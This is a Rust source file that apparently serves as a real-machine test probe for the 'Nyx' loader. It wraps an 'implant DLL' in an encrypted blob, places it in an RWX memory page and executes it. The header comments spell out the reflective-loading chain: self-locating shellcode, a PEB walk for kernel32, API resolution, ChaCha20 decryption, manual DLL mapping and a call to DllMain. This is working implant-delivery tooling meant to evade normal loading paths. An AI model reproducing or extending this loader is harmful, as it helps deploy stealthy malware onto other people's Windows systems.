//! Real-machine Layer-2 reflective-loader probe.
//!
//! Runs the COMPLETE Nyx loader stack inside a real Windows process — no
//! emulator, no rundll32:
//!
//!   1. Reads the implant DLL (argv[1]) that Layer-2 must reflectively load.
//!   2. Builds the full NYX2 blob in-process via `nyx_loader::wrap_payload`
//!      (random per-run key/nonce) — the exact artifact the release pipeline
//!      ships.
//!   3. VirtualAlloc's an RWX page, copies the blob, and calls its entry as
//!      `extern "C" fn() -> usize`.
//!   4. Layer-1 self-locates (`call $+5; pop rax`), XOR-recovers the magic,
//!      scans to the header, the bridge sets the pic-loader Win64 ABI
//!      (rcx/rdx/r8/r9), Layer-2 PEB-walks for kernel32, resolves
//!      VirtualAlloc/RtlMoveMemory/etc., decrypts the ciphertext with
//!      ChaCha20-Poly1305, reflectively maps the DLL, and calls DllMain.
//!   5. Layer-2 returns 0 on success; the probe exits 0 iff rv == 0.
//!
//! Why this works on GitHub-hosted runners: the probe never uses rundll32 or
//! LoadLibrary on the target blob (the paths that hang in non-interactive
//! Session 0 / Server-2025 loader quirks). It is a plain console process with
//! VirtualAlloc + a direct call — no window station, no desktop APIs.
//!
//! Exit codes: 0 = full E2E passed (DllMain ran); 1 = blob failed;
//! 2 = usage/build error; 0xE1 = Layer-2 returned non-zero (tag mismatch etc).

use std::os::raw::c_void;
use std::process::ExitCode;

#[cfg(target_os = "windows")]
extern "system" {
    fn VirtualAlloc(
        lp_address: *mut c_void,
        dw_size: usize,
        fl_allocation_type: u32,
        fl_protect: u32,
    ) -> *mut c_void;
    fn VirtualFree(lp_address: *mut c_void, dw_size: usize, dw_free_type: u32) -> i32;
}

#[cfg(target_os = "windows")]
const MEM_COMMIT_RESERVE: u32 = 0x1000 | 0x2000;
#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
#[cfg(target_os = "windows")]
const MEM_RELEASE: u32 = 0x8000;

#[cfg(not(target_os = "windows"))]
fn main() {
    // The probe is a Windows-host artifact; on other platforms the workspace
    // builds a no-op so macOS/Linux `cargo test --workspace` still links.
    eprintln!("nyx-loader-probe-exe: Windows-only (real-machine Layer-2 probe); nothing to do on this host");
}

#[cfg(target_os = "windows")]
fn main() -> ExitCode {
    let dll_path = match std::env::args().nth(1) {
        Some(p) => p,
        None => {
            eprintln!("usage: nyx-loader-probe.exe <implant-dll>");
            return ExitCode::from(2);
        }
    };
    let dll_bytes = match std::fs::read(&dll_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: cannot read {dll_path}: {e}");
            return ExitCode::from(2);
        }
    };
    println!("[probe] reflective target: {dll_path} ({} bytes)", dll_bytes.len());

    let blob = match nyx_loader::wrap_payload(&dll_bytes, &nyx_loader::LoaderConfig::random()) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: wrap_payload failed: {e}");
            return ExitCode::from(2);
        }
    };
    println!("[probe] blob: {} bytes (Layer-1 + key + header + ct + Layer-2)", blob.len());

    // SAFETY: blob is valid for blob.len() bytes; the page is RWX so Layer-2's
    // self-modifying/thunk work is permitted. `exec` below treats it as code.
    let base = unsafe { VirtualAlloc(std::ptr::null_mut(), blob.len(), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE) };
    if base.is_null() {
        eprintln!("error: VirtualAlloc failed (last error {})", std::io::Error::last_os_error());
        return ExitCode::from(2);
    }
    unsafe { std::ptr::copy_nonoverlapping(blob.as_ptr(), base as *mut u8, blob.len()) };

    // Layer-1 self-locates via call/pop, so no args are needed; Layer-2's
    // final `ret` returns to OUR call site with the result in rax.
    // SAFETY: base holds the blob bytes, mapped RWX; entry is the documented
    // self-locating PIC entry (call $+5 at offset 0).
    let entry: extern "C" fn() -> usize = unsafe { std::mem::transmute(base) };
    let rv = entry();
    println!("[probe] Layer-2 returned 0x{rv:x} ({})", if rv == 0 { "PASS" } else { "FAIL" });

    // SAFETY: page no longer needed; MEM_RELEASE frees the whole allocation.
    unsafe { VirtualFree(base, 0, MEM_RELEASE) };

    if rv == 0 {
        println!("loader-probe-exe: PASS — DllMain ran under real Windows");
        ExitCode::SUCCESS
    } else {
        println!("loader-probe-exe: FAIL — Layer-2 returned {rv:#x}");
        ExitCode::from(0xE1)
    }
}
